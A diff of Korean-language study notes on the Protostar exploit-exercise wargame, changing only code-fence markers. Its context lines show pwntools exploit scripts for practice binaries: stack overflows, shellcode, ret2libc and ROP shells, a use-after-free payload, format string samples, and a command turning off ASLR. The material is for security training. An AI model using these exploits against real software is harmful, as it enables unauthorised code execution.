@@ -90,7 +90,7 @@ https://github.com/longld/peda
 >4698452060381725001 found at offset: 72
 
 파이썬 코드
-'''python 
+```python 
 from pwn import *
 
 p = process('./stack3')
@@ -99,12 +99,12 @@ payload = 'A'*72 + win_addr
 
 p.sendline(payload)
 print p.recvrepeat(1)
-'''
+```
 =======================================================
 
 ## 프로토스타 - 7. stack4 return 덮어씌워서 코드 흐름 바꾸기
 
-'''python 
+```python 
 from pwn import *
 
 winaddr = p64(0x0000000000400537)
@@ -113,7 +113,7 @@ payload = 'A' * 72 + winaddr
 p = process(['./stack4'])
 p.sendline(payload)
 print p.recvrepeat(1)
-'''
+```
 =======================================================
 
 ## 프로토스타 - 8. stack5 쉘코드 생성, 리눅스 어태치 방법
@@ -129,7 +129,7 @@ print p.recvrepeat(1)
 5. pwn 프로그램에 엔터를 누른다. (sendline)
 6. 익스플로잇이 성공했는지 확인한다.
 
-'''python !stack5.py
+```python !stack5.py
 from pwn import *
 
 buf =  ""
@@ -147,7 +147,7 @@ p.sendline(payload)
 print p.recvrepeat(1)
 
 p.interactive()
-'''
+```
 =======================================================
 
 ## 프로토스타 - 9. stack5 또다른 해결 방법 ret2lib
@@ -157,7 +157,7 @@ p.interactive()
 
 
 파이썬 코드
-'''python stack5.py
+```python stack5.py
 
 from pwn import * 
 
@@ -171,7 +171,7 @@ payload = 'A'*offset + system + dummy + bin_sh
 p = process(['stack5'])
 p.sendline(payload)
 p.interactive()
-'''
+```
 =======================================================
 
 ## 프로토스타 - 10. stack6 함정을 지나 ret하기
@@ -181,7 +181,7 @@ p.interactive()
 
 > ret and 0xbf000000 == 0xbf000000
 
-'''python stack6.py
+```python stack6.py
 
 from pwn import * 
 
@@ -195,7 +195,7 @@ payload = 'A'*offset + system + dummy + bin_sh
 p = process(['stack6'])
 p.sendline(payload)
 p.interactive()
-'''
+```
 =======================================================
 
 ## 프로토스타 - 11. stack7 jmpcall을 사용한 우회 방법
@@ -203,7 +203,7 @@ p.interactive()
 - 칼리리눅스 ASLR 끄기
 > echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 
-'''python stack7.py
+```python stack7.py
 
 from pwn import * 
 
@@ -227,7 +227,7 @@ payload = 'A'*offset + jmp_rsp + buf
 p = process(['stack7'])
 p.sendline(payload)
 p.interactive()
-'''
+```
 =======================================================
 
 ## 프로토스타 - 12. stack7 ROP 기초를 이용한 우회 방법
@@ -236,7 +236,7 @@ p.interactive()
 > echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 
 
-'''python stack7.py
+```python stack7.py
 
 from pwn import * 
 
@@ -251,12 +251,12 @@ payload = 'A'*offset + ret + system + dummy + bin_sh
 p = process(['stack7'])
 p.sendline(payload)
 p.interactive()
-'''
+```
 =======================================================
 
 ## 프로토스타 - 13. 포맷 스트링 버그(format string bug)로 무엇을 할 수 있나 - 1. 허용되지 않은 데이터 읽어내기
 
-'''c format_printf.c
+```c format_printf.c
 
 int main()
 {
@@ -272,7 +272,7 @@ int main()
  printf(buf);
  return 0;
 }
-'''
+```
 =======================================================
 
 ## 프로토스타 - 14. 포맷 스트링 버그(format string bug)로 무엇을 할 수 있나 - 2. 허용되지 않은 데이터 쓰기
@@ -280,7 +280,7 @@ int main()
 - 프로토스타 format string bug
 https://exploit-exercises.com/protostar/
 
-'''c format_printf_n
+```c format_printf_n
 int main()
 { 
  int a = 0;
@@ -293,7 +293,7 @@ int main()
   
  return 0;
 }
-'''
+```
 =======================================================
 
 ## 프로토스타 - 15. format0 sprintf 오버플로우
@@ -323,13 +323,13 @@ https://www.syslinux.org/wiki/index.php?title=Heap_Management
 
 ### 스택 vs. 힙
 
-'''python 
+```python 
 정적 메모리 동적 메모리
 push []       프로그래머에 의해서 관리
 작은  큰 (malloc, class)
 주소:아래서 위로 주소:위에서 아래로
 EBP//ESP  헤더
-'''
+```
 
 - 칼리 ASLR disable
 > echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
@@ -390,7 +390,7 @@ http://shayete.tistory.com/entry/7-Use-After-Free
 - 패턴 생성
 > pattern create 150
 
-'''python !uaf1.py
+```python !uaf1.py
 from pwn import *
 
 offset = 46
@@ -405,7 +405,7 @@ print p.recvrepeat(1)
 pause()
 p.sendline(payload)
 p.interactive()
-'''
+```
 =======================================================
 
 ## 프로토스타 튜토리얼 - 24. DFB(Double Free bug) 이해와 실습
